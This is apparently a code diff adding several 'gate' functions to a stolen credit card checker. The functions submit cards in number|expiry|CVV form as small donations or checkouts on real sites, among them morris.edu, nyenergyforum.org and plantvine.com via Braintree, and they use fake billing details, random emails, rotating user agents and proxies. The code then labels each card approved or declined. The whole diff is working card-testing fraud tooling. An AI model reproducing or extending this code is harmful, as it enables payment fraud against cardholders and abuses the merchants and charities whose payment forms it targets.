-            if "security code" in warning: return "CCN Live (Security Code)", "APPROVED"
-            return f"Declined ({warning})", "DECLINED"
-        
-        if 'success' in str(result):
-            return "Approved (Auth)", "APPROVED"
-            
-        return "Declined", "DECLINED"
-
+        # 3. Submit donation
+        headers3 = {
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
+            'Content-Type': 'application/json; charset=UTF-8',
+            'Origin': 'https://www.morris.edu',
+            'Referer': 'https://www.morris.edu/',
+            'User-Agent': get_random_ua(),
+            'X-Requested-With': 'XMLHttpRequest',
+        }
+        # Generate random email
+        rand_email = ''.join(random.choices(string.ascii_lowercase, k=10)) + '@gmail.com'
+        payload3 = {
+            'CustomFieldKeyValueList': {
+                'gift_source': ['Alumni', '1', 'Gift Source'],
+                'gift_designation': ['Alumni Fund Drive', '1', 'Gift Designation'],
+                'i_would_like_this_gift_to_remain_anonymous': ['Yes', '1', 'I would like this gift to remain anonymous'],
+            },
+            'DataDescriptor': 'COMMON.ACCEPT.INAPP.PAYMENT',
+            'DataValueNonce': token,
+            'CurrentURL': '/donate-now',
+            'NodeID': '29522',
+            'PaymentMethodID': '2',
+            'Amount': '1.00',
+            'FormBlockID': '494',
+            'ItemName': 'undefinedAlumniAlumni Fund Dri',
+            'FirstName': 'anans',
+            'LastName': 'asdwr',
+            'BillingAddress1': '216 St James Ave',
+            'BillingAddress2': '216 St James Ave',
+            'BillingCity': 'Goose Creek',
+            'BillingState': 'New York',
+            'BillingZip': '10080',
+            'BillingCountry': '',
+            'PhoneNumber': '843-863-8882',
+            'Email': rand_email,
+        }
+        r3 = session.post('https://www.morris.edu/Page/IndexPCI', headers=headers3, json=payload3, timeout=20)
+        result = r3.json()
+        error_msg = result.get('ErrorMessage', '')
+        if error_msg:
+            # If the error message is a decline, return DECLINED
+            return error_msg, "DECLINED"
+        else:
+            return "Unknown success (check manually)", "APPROVED"
     except Exception as e:
-        return f"Error: {str(e)}", "ERROR"
+        return f"Process Error: {str(e)}", "ERROR"
+
+# ============================================================================
+# 🚪 GATE 3: NYEnergyForum (ASP.NET donation)
+# ============================================================================
+def check_nyenergyforum(cc, proxy=None):
+    """
+    Attempts a $5 donation on nyenergyforum.org.
+    Returns (message, status)
+    """
+    try:
+        cc = cc.strip()
+        parts = cc.split('|')
+        if len(parts) != 4:
+            return "Invalid card format", "ERROR"
+        n, mm, yy, cvc = parts
+        if len(yy) == 2:
+            yy = '20' + yy
+        yy_short = yy[2:]
+
+        session = requests.Session()
+        if proxy:
+            session.proxies = format_proxy(proxy)
+
+        # 1. Get donation form to extract viewstate values
+        headers1 = {
+            'authority': 'www.nyenergyforum.org',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'referer': 'https://www.nyenergyforum.org/',
+            'user-agent': get_random_ua(),
+        }
+        r1 = session.get('https://www.nyenergyforum.org/donate', headers=headers1, timeout=20)
+        if r1.status_code != 200:
+            return f"Initial page failed: {r1.status_code}", "ERROR"
+
+        def extract(name):
+            m = re.search(r'id="' + name + r'" value="(.*?)"', r1.text)
+            return m.group(1) if m else None
+
+        __VIEWSTATEGENERATOR = extract('__VIEWSTATEGENERATOR')
+        __EVENTVALIDATION = extract('__EVENTVALIDATION')
+        __VIEWSTATEFIELDCOUNT = extract('__VIEWSTATEFIELDCOUNT')
+        __VIEWSTATE = extract('__VIEWSTATE')
+        viewstates = []
+        for i in range(1, 18):
+            vs = extract(f'__VIEWSTATE{i}')
+            if vs:
+                viewstates.append(vs)
+
+        if not __VIEWSTATEGENERATOR or not __EVENTVALIDATION or not __VIEWSTATE:
+            return "Missing ASP.NET fields", "ERROR"
+
+        if n.startswith('4'):
+            cardtype = 'Visa'
+        elif n.startswith('5'):
+            cardtype = 'MasterCard'
+        elif n.startswith('3'):
+            cardtype = 'American Express'
+        else:
+            cardtype = 'Visa'
+
+        # 2. Submit donation
+        data = {
+            'ctl00$SearchInput1$txtSearch': '',
+            'ctl00$mainContent$ctl00$Donation': '$5.00',
+            'ctl00$mainContent$ctl00$FirstName': 'tome',
+            'ctl00$mainContent$ctl00$LastName': 'nwe',
+            'ctl00$mainContent$ctl00$JobTitle': '',
+            'ctl00$mainContent$ctl00$Organization': 'Tome',
+            'ctl00$mainContent$ctl00$Email': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)) + '@gmail.com',
+            'ctl00$mainContent$ctl00$Phone': '12703109664',
+            'ctl00$mainContent$ctl00$BillingCountry': 'USA',
+            'ctl00$mainContent$ctl00$BillingAddress': 'Rts 58',
+            'ctl00$mainContent$ctl00$BillingAddress2': '',
+            'ctl00$mainContent$ctl00$BillingCity': 'Iegdjwvx',
+            'ctl00$mainContent$ctl00$BillingState': 'NY',
+            'ctl00$mainContent$ctl00$BillingZip': '10080',
+            'ctl00$mainContent$ctl00$CardFirstName': 'Tome',
+            'ctl00$mainContent$ctl00$CardLastName': 'Napo',
+            'ctl00$mainContent$ctl00$CardType': cardtype,
+            'ctl00$mainContent$ctl00$CardNumber': n,
+            'ctl00$mainContent$ctl00$CardExpirationMonth': mm,
+            'ctl00$mainContent$ctl00$CardExpirationYear': yy_short,
+            'ctl00$mainContent$ctl00$CardCode': cvc,
+            '__EVENTTARGET': 'ctl00$mainContent$ctl00$Submit',
+            '__EVENTARGUMENT': '',
+            '__LASTFOCUS': '',
+            '__VIEWSTATEFIELDCOUNT': __VIEWSTATEFIELDCOUNT,
+            '__VIEWSTATE': __VIEWSTATE,
+            '__VIEWSTATEGENERATOR': __VIEWSTATEGENERATOR,
+            '__EVENTVALIDATION': __EVENTVALIDATION,
+        }
+        for i, vs in enumerate(viewstates, start=1):
+            data[f'__VIEWSTATE{i}'] = vs
+
+        headers2 = {
+            'authority': 'www.nyenergyforum.org',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.nyenergyforum.org',
+            'referer': 'https://www.nyenergyforum.org/donate',
+            'user-agent': get_random_ua(),
+        }
+        r2 = session.post('https://www.nyenergyforum.org/donate', headers=headers2, data=data, timeout=20)
+        msg = r2.text
+
+        if 'Thank you for your order.' in msg or 'Thank you' in msg or 'success' in msg.lower():
+            return "Thank You For Your Donation", "APPROVED"
+        else:
+            pattern = r'<strong>Please\s+correct\s+the\s+following:</strong>\s*<ul>\s*<li>(.*?)</li>'
+            match = re.search(pattern, msg, re.DOTALL)
+            if match:
+                err = match.group(1).strip()
+                return err, "DECLINED"
+            return "Unknown decline", "DECLINED"
+    except Exception as e:
+        return f"Process Error: {str(e)}", "ERROR"
+
+# ============================================================================
+# 🚪 GATE 4: PlantVine (Braintree) – from payzzz
+# ============================================================================
+def check_plantvine(cc, proxy=None):
+    """
+    Attempts to add a payment method on plantvine.com using Braintree.
+    Returns (message, status)
+    """
+    try:
+        cc = cc.strip()
+        parts = cc.split('|')
+        if len(parts) != 4:
+            return "Invalid card format", "ERROR"
+        n, mm, yy, cvc = parts
+        if len(yy) == 2:
+            yy = '20' + yy
+        yy_short = yy[2:]
+
+        session = requests.Session()
+        if proxy:
+            session.proxies = format_proxy(proxy)
+
+        user = get_random_ua()
+        session.headers.update({'User-Agent': user})
+
+        # Helper to generate random email
+        acc = ''.join(random.choices(string.ascii_lowercase, k=10)) + '@gmail.com'
+
+        # Step 1: Add product to cart
+        headers_add = {
+            'Accept': '*/*',
+            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://www.plantvine.com',
+            'Referer': 'https://www.plantvine.com/product/expandable-moss-pole/',
+            'X-Requested-With': 'XMLHttpRequest',
+        }
+        params_add = {'wc-ajax': 'xoo_wsc_add_to_cart'}
+        data_add = {
+            'quantity': '1',
+            'add-to-cart': ['223201', '223201'],
+            'action': 'xoo_wsc_add_to_cart',
+        }
+        session.post('https://www.plantvine.com/', params=params_add, headers=headers_add, data=data_add)
+
+        # Step 2: Go to checkout
+        headers_checkout = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Referer': 'https://www.plantvine.com/product/natural-root-stimulant/',
+            'Upgrade-Insecure-Requests': '1',
+        }
+        r_checkout = session.get('https://www.plantvine.com/checkout/', headers=headers_checkout)
+        time.sleep(4)
+
+        # Extract tokens
+        check_match = re.search(r'checkout-nonce name=woocommerce-process-checkout-nonce value=(.*?)>', r_checkout.text)
+        if not check_match:
+            return "Nonce not found", "ERROR"
+        check = check_match.group(1)
+
+        aut_raw = re.search(r'var wc_braintree_client_token = \["(.*?)"\]', r_checkout.text)
+        if not aut_raw:
+            return "Braintree token not found", "ERROR"
+        aut = aut_raw.group(1)
+        base4 = base64.b64decode(aut).decode('utf-8', errors='ignore')
+        au = base4.split('"authorizationFingerprint":')[1].split('"')[1]
+
+        sec = re.search(r'update_order_review_nonce":"(.*?)"', r_checkout.text).group(1)
+
+        # Step 3: Update order review (shipping info)
+        headers_update = {
+            'Accept': '*/*',
+            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://www.plantvine.com',
+            'Referer': 'https://www.plantvine.com/checkout/',
+            'X-Requested-With': 'XMLHttpRequest',
+        }
+        params_update = {'wc-ajax': 'update_order_review'}
+        data_update = f'security={sec}&payment_method=braintree_cc&country=US&state=NJ&postcode=10090&city=tome&address=errtowm&address_2=&s_country=US&s_state=NJ&s_postcode=10090&s_city=tome&s_address=errtowm&s_address_2=&has_full_address=true&post_data=billing_first_name%3Dxhhzjsj%26billing_last_name%3Djsksk%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3Derrtowm%26billing_address_2%3D%26billing_city%3Dtome%26billing_state%3DNJ%26billing_postcode%3D10090%26billing_phone%3D790824177%26billing_email%3D{acc}%2540gmail.com%26mailchimp_woocommerce_newsletter%3D1%26account_password%3D%26shipping_first_name%3Dxhhzjsj%26shipping_last_name%3Djsksk%26shipping_company%3D%26shipping_country%3DUS%26shipping_address_1%3Derrtowm%26shipping_address_2%3D%26shipping_city%3Dtome%26shipping_state%3DNJ%26shipping_postcode%3D10090%26order_comments%3D%26wc_order_attribution_type%3Dtypein%26wc_order_attribution_url%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.plantvine.com%252Fcart%252F%26wc_order_attribution_session_start_time%3D2025-01-10%252019%253A34%253A15%26wc_order_attribution_session_pages%3D8%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26shipping_method%255B0%255D%3Dflat_rate%253A7%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%257B%2522device_session_id%2522%253A%2522837c48b540bf10177b45cb3bd9383f14%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522670b38d38d233d11278f67d42b147bb7%2522%257D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%257B%2522device_session_id%2522%253A%2522837c48b540bf10177b45cb3bd9383f14%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522670b38d38d233d11278f67d42b147bb7%2522%257D%26braintree_googlepay_nonce_key%3D%26braintree_googlepay_device_data%3D%257B%2522device_session_id%2522%253A%2522837c48b540bf10177b45cb3bd9383f14%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522670b38d38d233d11278f67d42b147bb7%2522%257D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%257B%2522device_session_id%2522%253A%2522837c48b540bf10177b45cb3bd9383f14%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522670b38d38d233d11278f67d42b147bb7%2522%257D%26woocommerce-process-checkout-nonce={check}%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=flat_rate%3A7'
+        session.post('https://www.plantvine.com/', params=params_update, headers=headers_update, data=data_update)
+
+        # Step 4: Tokenize card via Braintree GraphQL
+        headers_token = {
+            'authority': 'payments.braintree-api.com',
+            'accept': '*/*',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'authorization': f'Bearer {au}',
+            'braintree-version': '2018-05-10',
+            'content-type': 'application/json',
+            'origin': 'https://assets.braintreegateway.com',
+            'referer': 'https://assets.braintreegateway.com/',
+        }
+        json_token = {
+            'clientSdkMetadata': {
+                'source': 'client',
+                'integration': 'custom',
+                'sessionId': '2863b4aa-1125-4646-aeb5-025ef07e7ea7',
+            },
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+            'variables': {
+                'input': {
+                    'creditCard': {
+                        'number': n,
+                        'expirationMonth': mm,
+                        'expirationYear': yy_short,
+                        'cvv': cvc,
+                        'billingAddress': {
+                            'postalCode': '10090',
+                            'streetAddress': 'errtowm',
+                        },
+                    },
+                    'options': {
+                        'validate': False,
+                    },
+                },
+            },
+            'operationName': 'TokenizeCreditCard',
+        }
+        r_token = session.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=json_token)
+        tok = r_token.json()['data']['tokenizeCreditCard']['token']
+
+        # Step 5: Final checkout submission
+        headers_final = {
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://www.plantvine.com',
+            'Referer': 'https://www.plantvine.com/checkout/',
+            'X-Requested-With': 'XMLHttpRequest',
+        }
+        params_final = {'wc-ajax': 'checkout'}
+        data_final = f'billing_first_name=xhhzjsj&billing_last_name=jsksk&billing_company=&billing_country=US&billing_address_1=errtowm&billing_address_2=&billing_city=tome&billing_state=NJ&billing_postcode=10090&billing_phone=790824177&billing_email={acc}%40gmail.com&mailchimp_woocommerce_newsletter=1&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&wc_order_attribution_type=typein&wc_order_attribution_url=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.plantvine.com%2Fcart%2F&wc_order_attribution_session_start_time=2025-01-10+19%3A34%3A15&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&shipping_method%5B0%5D=flat_rate%3A7&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=%7B%22device_session_id%22%3A%22168387d563becc11080bb4943aff34c5%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22c7cf845f2aa91a87539423392ae5e06b%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F6wymr2jqbc63z5t5%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F6wymr2jqbc63z5t5%22%7D%2C%22merchantId%22%3A%226wymr2jqbc63z5t5%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%226wymr2jqbc63z5t5%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22PlantVine%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzY2MjQxNjUsImp0aSI6ImQ2YmNkMjE0LTBmNGEtNGU2ZC1hNjBmLWUwNTQwYjY3MjcxNyIsInN1YiI6IjZ3eW1yMmpxYmM2M3o1dDUiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjZ3eW1yMmpxYmM2M3o1dDUiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.3l8gwCZEW6qSjEJ9x4jJtOgknesk41EsipxK_CeDsUdhG24L-kwE--iB5uj7AHHmwpOsQGyNhxjSF7sRnXX_fQ%22%2C%22paypalClientId%22%3Anull%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22PlantVine%22%2C%22clientId%22%3A%22AXyO7aGJ8e89YcywvfXnXa1cx-VtyyRlUSysaXblKYrrlDp6Na61V4EoQPcibGtRBCCbE7bd0WMrA9zk%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22plantvine_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22device_session_id%22%3A%22168387d563becc11080bb4943aff34c5%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22c7cf845f2aa91a87539423392ae5e06b%22%7D&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=%7B%22device_session_id%22%3A%22168387d563becc11080bb4943aff34c5%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22c7cf845f2aa91a87539423392ae5e06b%22%7D&braintree_applepay_nonce_key=&braintree_applepay_device_data=%7B%22device_session_id%22%3A%22168387d563becc11080bb4943aff34c5%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22c7cf845f2aa91a87539423392ae5e06b%22%7D&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
+
+        r_final = session.post('https://www.plantvine.com/', params=params_final, headers=headers_final, data=data_final)
+        text = r_final.text
+
+        if "Reason:" in text:
+            match = re.search(r'Reason:\s(.*?)(?:\\t|<)', text)
+            if match:
+                return match.group(1).strip(), "DECLINED"
+            else:
+                return "Unknown reason", "DECLINED"
+        else:
+            return "Fraud Rejection", "DECLINED"
+    except Exception as e:
+        return f"Process Error: {str(e)}", "ERROR"
